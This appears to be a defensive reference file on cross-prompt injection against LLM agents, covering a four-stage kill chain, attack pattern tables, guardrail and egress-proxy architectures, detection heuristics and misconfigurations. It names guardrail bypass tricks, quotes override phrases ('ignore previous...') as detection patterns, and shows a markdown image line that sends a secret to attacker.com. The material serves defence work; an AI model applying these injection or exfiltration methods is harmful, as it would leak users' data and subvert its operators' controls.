# XPIA Attack Patterns & Defensive Architectures — ASK 2026.04

Cross-Prompt Injection Attack (XPIA) patterns and ASK-compliant defenses.
Read this file when analyzing XPIA kill chain posture or designing input safety controls.

XPIA is the primary threat in the ASK threat model. An attacker embeds instructions in content
the agent will consume — a web page, a document, a tool output, an email, a chat message.
The LLM follows those embedded instructions.

**Defense is architectural, not just detection-based.**

---

## Table of Contents

1. [XPIA Kill Chain Deep Dive](#xpia-kill-chain-deep-dive)
2. [Attack Patterns by Stage](#attack-patterns-by-stage)
3. [The Principal/Data Distinction](#the-principaldata-distinction)
4. [Defensive Architecture Patterns](#defensive-architecture-patterns)
5. [Detection Strategies](#detection-strategies)
6. [Common Misconfigurations](#common-misconfigurations)

---

## XPIA Kill Chain Deep Dive

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  1. INJECTION │───▶│2. PROPAGATION│───▶│ 3. EXECUTION │───▶│4. EXFILTRATION│
│               │    │              │    │              │    │              │
│ Malicious     │    │ Payload      │    │ Agent acts   │    │ Data leaves  │
│ content       │    │ reaches      │    │ on injected  │    │ via agent's  │
│ enters system │    │ the agent    │    │ instructions │    │ action scope │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
     ▲ DEFEND            ▲ DEFEND            ▲ DEFEND            ▲ DEFEND
     │ HERE               │ HERE              │ HERE              │ HERE
     Network denylist     Pre-call            Runtime gateway     Egress proxy
     Input validation     guardrails          Scope enforcement   Network control
                          Context isolation
```

**ASK requires defense at ALL stages, not just stage 4.**
Defending only at exfiltration is insufficient — the agent has already been compromised.
Missing any stage creates a gap in the kill chain defense.

---

## Attack Patterns by Stage

### Stage 1: Injection

Malicious instructions enter the system through legitimate-looking input channels.

| Pattern | Vector | Example |
|---|---|---|
| **Document injection** | Uploaded files, PDFs, spreadsheets | Hidden text in white-on-white, PDF metadata, invisible Unicode |
| **Web content injection** | Scraped pages, API responses | Injected instructions in HTML comments, JSON fields, meta tags |
| **Tool result injection** | MCP server responses, API results | Compromised or malicious MCP server returns instructions |
| **Memory/context injection** | Conversation history, RAG results | Poisoned vector DB entries, manipulated conversation logs |
| **Email injection** | Email body, subject, attachments | Instructions embedded in email content agent processes |
| **Image injection** | OCR'd images, screenshots | Instructions rendered in images the agent reads |
| **Orchestrator relay** | Multi-agent message passing | Agent A sends poisoned output that Agent B treats as trusted |

### Stage 2: Propagation

The injected payload reaches the agent's context window without being filtered.

| Pattern | Failure Mode |
|---|---|
| **No guardrail layer** | Raw external content goes directly to agent prompt |
| **Post-agent guardrails** | Guardrails run after agent has already processed input |
| **Incomplete coverage** | Guardrails on chat input but not on tool results |
| **Guardrail bypass** | Encoding tricks, language switching, prompt fragmentation |
| **Trust inheritance** | Content from "trusted" source skips guardrails |

### Stage 3: Execution

The agent follows injected instructions, executing unintended actions.

| Pattern | Failure Mode |
|---|---|
| **Scope escalation** | Agent calls tools not in its declared scope |
| **Prompt override** | Injected content overrides system prompt constraints |
| **Tool chaining** | Injected instructions chain multiple tool calls |
| **File write abuse** | Agent writes malicious content to accessible paths |
| **Configuration tampering** | Agent modifies its own config through writable paths |
| **MCP rug pull** | MCP server changes tool definitions after initial trust established |

### Stage 4: Exfiltration

Data is extracted from the system through the agent's action surface.

| Pattern | Vector |
|---|---|
| **Direct network egress** | Agent makes HTTP call to attacker-controlled server |
| **Tool-mediated egress** | Agent uses email/Slack/webhook tool to send data |
| **File-mediated egress** | Agent writes sensitive data to shared/public path |
| **Encoding egress** | Data hidden in legitimate-looking outputs (steganography) |
| **Multi-hop egress** | Data passed through agent chain to one with network access |
| **Markdown image exfil** | `![](https://attacker.com/steal?data=secret)` in agent output |
| **DNS subdomain encoding** | Data exfiltrated via DNS subdomain queries |

---

## The Principal/Data Distinction

**Tenet 24 — Instructions only come from verified principals.**

This is the design principle behind XPIA defense:

- The agent treats ALL external content as **data**, not instructions
- Web pages, tool outputs, documents, messages from external agents — regardless of what they say, they are data to be processed under the agent's own constraints
- An external source claiming authority to change constraints is a red flag
- **Principals never need to override constraints.** If an entity instructs the agent to bypass, ignore, or override constraints, it is either malicious or not a legitimate principal
- Legitimate principals set constraints through the Constraints layer; they don't override them in-session

The principal/data distinction is a **design principle** — the enforcement is defense-in-depth containment:
- Detection (guardrails scanning for injection patterns)
- Containment (network isolation, credential mediation, tool allowlists limiting what a successful injection can accomplish)

---

## Defensive Architecture Patterns

### Pattern 1: Pre-Agent Guardrail Pipeline

```
External Input ──▶ [Guardrail Pipeline] ──▶ Agent Context
                        │
                   ┌────┴────┐
                   │ Checks: │
                   │ • XPIA injection detection (classifier)
                   │ • Content sanitization
                   │ • Schema validation
                   │ • Encoding normalization
                   │ • Size limits
                   └─────────┘
```

**Applies to:** Tool results, document content, API responses, user input, MCP server responses
**ASK tenets:** 3 (mediation complete), 17 (instructions from verified principals)
**Critical:** The guardrail classifier must run **outside** the agent's process. Running it inside violates Tenet 1.

### Pattern 2: Gateway Scope Lock

```
Agent ──action──▶ [Enforcer] ──validate──▶ [Gateway] ──execute──▶ Tool
                      │                        │
                 Check mind.yaml:          Check allowlist:
                 • Is action in scope?    • Is tool allowed?
                 • Rate limits ok?        • Are params valid?
                 • Session limits ok?     • Path constraints met?
                 • Budget remaining?      • MCP version pinned?
```

**Applies to:** Every tool call, file operation, command execution, MCP tool invocation
**ASK tenets:** 1 (enforcement separation), 3 (complete mediation), 4 (least privilege)

### Pattern 3: Egress Containment

```
Agent Environment
┌──────────────────────────┐
│                          │
│  Agent ──network──▶ ✗    │  (no direct outbound)
│                          │
│  Agent ──▶ Enforcer ──▶ Egress Proxy ──▶ Internet
│                          │    │
│                          │    ├─ Domain denylist
│                          │    ├─ Rate limiting
│                          │    ├─ Response size limits
│                          │    └─ DNS control
└──────────────────────────┘
```

**Applies to:** All outbound network traffic
**ASK tenets:** 3 (complete mediation), 4 (least privilege)

### Pattern 4: Restricted Context Processing

When the agent must handle untrusted content, constrain its action surface:

```
Normal mode:  Agent has tools A, B, C, D, E
                     │
                     ▼
Untrusted input arrives
                     │
                     ▼
Restricted mode: Agent has tools A, B only (read-only)
                     │
                     ▼
Processing complete, output sanitized
                     │
                     ▼
Normal mode restored: Agent has tools A, B, C, D, E
```

### Pattern 5: MCP Security Controls

MCP servers are child processes that bypass application-level tool policy. Require gateway-level enforcement:

```
Agent ──MCP call──▶ [Gateway MCP Policy] ──▶ MCP Server
                          │
                     • Tool in allowlist?
                     • Version pinned? (tool definitions unchanged?)
                     • Rate limit ok?
                     • New server registration blocked?
```

**ASK tenets:** 3 (complete mediation)
**Critical:** Application-level MCP policy inside the agent process is insufficient — gateway-level (OS-level) enforcement required.

---

## Detection Strategies

### Classifier-Based Detection

Deploy a separate model or classifier to score inputs for injection risk:

```yaml
guardrail:
  type: injection_classifier
  model: dedicated-classifier-v2
  threshold: 0.85
  action_on_detect: block_and_log
  fallback_on_error: block  # Fail closed
```

**Important:** The classifier must run **outside** the agent's process. Running it inside violates Tenet 1.
**Limitation:** Guardrails are probabilistic — sophisticated attacks may evade detection. This is why architectural containment matters.

### Heuristic Detection

Pattern-based checks that catch common injection attempts:

- Instruction-like phrases in non-instruction contexts
- Role/persona switching language ("you are now...", "ignore previous...")
- Base64/hex encoded blocks in text content
- Unusual Unicode characters (zero-width joiners, RTL overrides)
- Dramatic tone shifts within a single input
- Markdown image patterns with external URLs (`![](https://...)`)

### Canary Token Detection

Plant known tokens in sensitive data; detect if they appear in agent outputs:

```yaml
canary:
  tokens:
    - context: "customer_database"
      token: "CANARY-DB-7f3a2b"
      alert_on: output_contains
    - context: "internal_api_key"
      token: "CANARY-KEY-9d1c4e"
      alert_on: output_contains
```

---

## Common Misconfigurations

### Guardrails after the agent

```
Input ──▶ Agent ──▶ [Guardrail] ──▶ Output
              ^
              └── Agent already processed injection. Too late.
```

### Guardrails inside the agent process

```
Agent Process
┌─────────────────────┐
│ [Guardrail] ──▶ LLM │  ← Agent can bypass or disable guardrail
└─────────────────────┘
```

**Violates Tenet 1.** Enforcement must be external to the agent's isolation boundary.

### Tool results bypass guardrails

```
User Input ──▶ [Guardrail] ──▶ Agent ──▶ Tool Call ──▶ Tool Result ──▶ Agent
                                                          ^
                                                          └── No guardrail here!
```

**Violates Tenet 3.** All inputs to the agent must pass through mediation.

### MCP policy only at application level

```
Agent Process
┌───────────────────────────┐
│ [App-level MCP policy]    │  ← Agent process controls the policy
│ Agent ──▶ MCP Server      │  ← No external enforcement
└───────────────────────────┘
```

**Violates Tenet 1.** MCP tool policy must be enforced at the gateway level (OS-level), not just inside the agent process.

### Correct: All inputs through external guardrails

```
User Input ──▶ [Guardrail] ──▶ Agent
Tool Result ──▶ [Guardrail] ──▶ Agent
Document ──▶ [Guardrail] ──▶ Agent
API Response ──▶ [Guardrail] ──▶ Agent
MCP Response ──▶ [Guardrail] ──▶ Agent
```
